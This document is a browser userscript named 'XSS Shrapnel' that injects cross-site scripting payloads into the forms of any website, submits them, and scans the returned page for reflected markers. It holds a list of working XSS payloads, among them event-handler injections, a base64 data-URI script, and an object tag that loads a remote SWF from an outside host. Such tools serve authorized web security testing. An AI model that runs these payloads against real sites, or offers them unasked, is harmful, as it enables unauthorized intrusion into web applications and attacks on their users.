// ==UserScript==
// @name        XSS Shrapnel
// @namespace   *
// @description aaa"bbb'ccc<ddd>zzz
// @include     *
// @version     2.3
// @grant       none
// ==/UserScript==

var bForceUrlEncoded = 1
var bFillHiddenForms = 0

var iPayload = 0

var aPayloads = ['aaa"bbb\'ccc<ddd>zzz', 
		 'aaa"bbb\'zzz', 
		 'aaa"zzz', 
		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>zzz<fff', 
		 'aaa\\"bbb\\\'ccc<ddd >zzz</fff>', 
		 '</title></textarea>aaa"bbb\'ccc<ddd>zzz', 
		 'aaa"><svg onload=alert(document.domain)>zzz', 
		 'aaa" autofocus onfocus="alert(document.domain)"zzz', 
		 'aaa" onmouseover="alert(document.domain)"zzz', 
		 'aaa" accesskey=x onclick="alert(document.domain)"zzz', 
		 'aaa\'-alert(document.domain)-\'zzz', 
		 'aaa"-alert(document.domain)-"zzz', 
		 'aaa"><video src onratechange=prompt(document.domain)>zzz', 
		 'aaa"><xxx onbeforescriptexecute=prompt(document.domain)>zzz', 
		 'aaa"><object allowscriptaccess=always data=http://spqr.zz.mu/xss.swf>zzz', 
		 'aaa"><meta http-equiv=refresh content="0;URL=http://youtu.be/dQw4w9WgXcQ">zzz', 
		 'aaa"><form action=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz']

var regex = /.{0,100}aaa.{0,130}?zzz.{0,100}/gi

window.addEventListener
(
	'keydown', 
	function (e)
	{
		if (e.altKey || e.modifiers)
		{
			if (e.keyCode == 72)
			{
				var sPrompt = prompt ('Fill hidden forms?', bFillHiddenForms)
				
				sPrompt === null || (bFillHiddenForms = parseInt (sPrompt))
			}
			
			if (e.keyCode == 80)
			{
				var sPrompt = prompt ('Set payload', iPayload)
				
				if (sPrompt !== null)
				{
					if (isNaN (+sPrompt))
					{
						iPayload = InArray (aPayloads, sPrompt)
						
						if (iPayload == -1)
						{
							aPayloads.push (sPrompt)
							
							iPayload = aPayloads.indexOf (sPrompt)
						}
					}
					else
						iPayload = parseInt (sPrompt) % aPayloads.length
				}
				
				prompt ('Payload', aPayloads [iPayload])
			}
			
			if (e.target.form)
			{
				var parentForm = e.target.form
				
				e.keyCode == 83 && submitForm (parentForm)
				e.keyCode == 65 && fillForm (parentForm) && submitForm (parentForm)
			}
			
			if (e.keyCode == 70)
				fillForms ()
			
			if (e.keyCode == 82)
				checkResults ()
		}
	}, 
	false
)

window.addEventListener ('DOMContentLoaded', checkResults, false)
window.addEventListener ('load', checkResults, false)

function checkResults ()
{
	var matches = document.getElementsByTagName ('html') [0].innerHTML.match (regex)
	
	if (matches instanceof Array)
	{
		matches = matches.join ('\r\n\r\n').split (/([\s\S]{10000})/)
		
		matches.forEach (function (i) {i && alert (i)})
	}
}

function fillForms ()
{
	for (var i = 0; i < document.forms.length; i++)
	{
		var form = document.forms [i]
		
		form.target = '_blank'
		
		fillForm (form) && submitForm (form)
	}
}

function submitForm (form)
{
	var aPostData = []
	
	for (var i = 0; i < form.length; i++)
	{
		var sPostData = encodeURIComponent (form [i].name) + '=' + encodeURIComponent (form [i].value)
		
		form [i].name && aPostData.indexOf (sPostData) == -1 && aPostData.push (sPostData)
	}
	
	bForceUrlEncoded && (form.enctype = 'application/x-www-form-urlencoded')
	
	//	var sFormAction = form.getAttribute ('action')
	//
	//	if (!/^https?:\/\//.test (sFormAction))
	//		sFormAction = /\/\//.test (sFormAction) ? location.protocol + sFormAction : location.origin + sFormAction
	
	var sFormAction = form.action ? form.action : location.origin + location.pathname
	var sDelimeter = form.getAttribute ('method').toLowerCase () == 'post' ? '\r\n\r\n' : '?'
	
	var sFormData = sFormAction + sDelimeter + aPostData.join ('&')
	
	confirm (sFormData) && HTMLFormElement.prototype.submit.call (form)
}

function fillForm (form)
{
	for (var i = 0; i < form.length; i++)
	{
		var element = form [i]
		var payload = aPayloads [iPayload]
		
		if (element.tagName == 'SELECT' || element.type == 'file')
		{
			element.outerHTML = '<input name="' + htmlEncode (element.name) + '" value="' + htmlEncode (payload) + '" />'
			
			continue
		}
		
		if (!bFillHiddenForms && element.type == 'hidden')
			continue
			
		element.value = payload
	}
	
	return 1
}

function htmlEncode (str)
{
	return str.replace (/</g, '&lt;').replace (/>/g, '&gt;').replace (/"/g, '&quot;').replace (/'/g, '&#39;')
}

function InArray (arr, elem)
{
	for (var i = 0; i < arr.length; i++)
		if (arr [i].indexOf (elem) + 1)
			return i
	
	return -1
}
